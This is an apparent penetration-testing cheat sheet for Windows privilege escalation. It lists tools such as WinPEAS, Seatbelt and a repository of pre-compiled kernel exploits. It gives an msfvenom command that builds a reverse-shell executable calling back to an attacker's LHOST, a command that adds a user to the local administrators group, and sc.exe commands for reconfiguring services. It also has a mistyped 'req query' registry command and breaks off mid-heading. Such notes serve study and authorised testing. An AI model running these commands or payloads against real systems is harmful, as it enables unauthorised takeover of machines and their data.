# Window's Privilege Escalation

## Tools

### WinPEAS

```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe

press enter if hangs @ end
```

### Seatbelt

```
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
```

## Spawn Admin Shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <FILE>
```
```
net localgroup administrators <USERNAME> /add   # If RDP is enabled
```

## Kernel Exploits

### Windows Exploit Suggester

```
https://github.com/bitsadmin/wesng
```

### SecWiki (Pre-compiled Binaries)

```
https://github.com/SecWiki/windows-kernel-exploits
```

### Enumerate Version

```
systeminfo
```

## Service Exploits

### Enumeration

```
sc.exe qc <NAME>                            # Query config of service
sc.exe query <NAME>                         # Query current status of service
sc.exe config <NAME> <OPTION>= <VALUE>      # Modify config option of service

net start/stop <NAME>                       # Start and stop the service
```

## Registry

### AutoRuns

```
req query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### MSI Files (AlwaysInstallElevated
